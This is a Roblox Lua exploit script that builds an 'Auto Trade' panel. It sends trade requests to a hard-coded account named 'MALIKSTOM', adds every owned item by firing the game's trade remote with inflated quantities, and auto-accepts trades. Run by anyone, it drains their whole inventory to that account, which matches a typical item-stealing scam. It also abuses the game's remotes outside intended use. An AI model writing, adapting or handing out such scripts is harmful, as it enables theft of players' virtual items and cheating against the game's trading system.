local rs = game:GetService("ReplicatedStorage")
local player = game.Players.LocalPlayer
local paper = require(rs:WaitForChild("Paper"))
local tradeRemote = rs.Paper.Remotes.Trade
local network = paper.Network

local targetName = "MALIKSTOM"
local targetPlayer = game.Players:FindFirstChild(targetName)

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 200, 0, 150)
mainFrame.Position = UDim2.new(0, 10, 0, 10)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BackgroundTransparency = 0.1
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Text = "Auto Trade"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.Parent = mainFrame

local acceptToggle = Instance.new("TextButton")
acceptToggle.Size = UDim2.new(0, 180, 0, 30)
acceptToggle.Position = UDim2.new(0, 10, 0, 40)
acceptToggle.Text = "Auto Accept: OFF"
acceptToggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
acceptToggle.Parent = mainFrame

local tradeToggle = Instance.new("TextButton")
tradeToggle.Size = UDim2.new(0, 180, 0, 30)
tradeToggle.Position = UDim2.new(0, 10, 0, 80)
tradeToggle.Text = "Auto Trade: OFF"
tradeToggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
tradeToggle.Parent = mainFrame

local acceptEnabled = false
local tradeEnabled = false
local isTrading = false

local function acceptTradeRequest()
    local playerGui = player:WaitForChild("PlayerGui")
    local main = playerGui:WaitForChild("Main")
    local requestsFrame = main:FindFirstChild("Requests")
    
    if not requestsFrame then return false end
    
    for _, request in requestsFrame:GetChildren() do
        if request:IsA("Frame") and request.Name ~= "UIListLayout" then
            local acceptButton = request:FindFirstChild("Accept")
            if acceptButton then
                acceptButton:Click()
                print("Accepted trade request from:", request.Name)
                return true
            end
        end
    end
    return false
end

local function waitForTradeAndConfirm()
    local menus = player.PlayerGui:WaitForChild("Menus")
    local tradingFrame = nil
    
    repeat
        task.wait(0.5)
        tradingFrame = menus:FindFirstChild("Trading")
    until tradingFrame and tradingFrame:FindFirstChild("Frame")
    
    local frame = tradingFrame.Frame
    
    repeat
        task.wait(0.1)
    until frame.My and frame.Other
    
    local function checkAndAccept()
        if frame.Accept and frame.Accept.Visible then
            frame.Accept:Click()
            print("Accepted trade")
            return true
        end
        return false
    end
    
    while true do
        if frame.Countdown and frame.Countdown.Visible then
            print("Countdown started")
            break
        end
        checkAndAccept()
        task.wait(0.5)
    end
end

local function sendTradeRequest()
    if not targetPlayer then
        print("Target player not found")
        return false
    end
    network.FireServer("Sent Trade Request", targetPlayer)
    print("Trade request sent to", targetName)
    return true
end

local function addAllItems()
    local itemsData = paper.Stats.Get("Items").Value
    local menus = player.PlayerGui:WaitForChild("Menus")
    local tradingFrame = menus:FindFirstChild("Trading")
    
    if not tradingFrame then return false end
    
    local frame = tradingFrame.Frame
    
    for itemName, amount in pairs(itemsData) do
        if amount > 0 then
            for i = 1, 5 do
                tradeRemote:FireServer("Item", itemName, 99)
                task.wait(0.05)
            end
            task.wait(0.1)
        end
    end
    
    return true
end

local function startTrade()
    if isTrading then return end
    isTrading = true
    
    sendTradeRequest()
    
    local menus = player.PlayerGui:WaitForChild("Menus")
    local tradingFrame = nil
    
    repeat
        task.wait(0.5)
        tradingFrame = menus:FindFirstChild("Trading")
    until tradingFrame and tradingFrame:FindFirstChild("Frame")
    
    addAllItems()
    task.wait(1)
    tradeRemote:FireServer("Accept")
    
    isTrading = false
end

local function startAutoAccept()
    while acceptEnabled do
        acceptTradeRequest()
        
        local menus = player.PlayerGui:WaitForChild("Menus")
        local tradingFrame = menus:FindFirstChild("Trading")
        
        if tradingFrame and tradingFrame:FindFirstChild("Frame") then
            waitForTradeAndConfirm()
        end
        
        task.wait(1)
    end
end

local function startAutoTrade()
    while tradeEnabled do
        if not isTrading then
            startTrade()
        end
        task.wait(1)
    end
end

acceptToggle.MouseButton1Click:Connect(function()
    acceptEnabled = not acceptEnabled
    if acceptEnabled then
        acceptToggle.Text = "Auto Accept: ON"
        acceptToggle.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        task.spawn(startAutoAccept)
    else
        acceptToggle.Text = "Auto Accept: OFF"
        acceptToggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

tradeToggle.MouseButton1Click:Connect(function()
    tradeEnabled = not tradeEnabled
    if tradeEnabled then
        tradeToggle.Text = "Auto Trade: ON"
        tradeToggle.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        task.spawn(startAutoTrade)
    else
        tradeToggle.Text = "Auto Trade: OFF"
        tradeToggle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end
end)
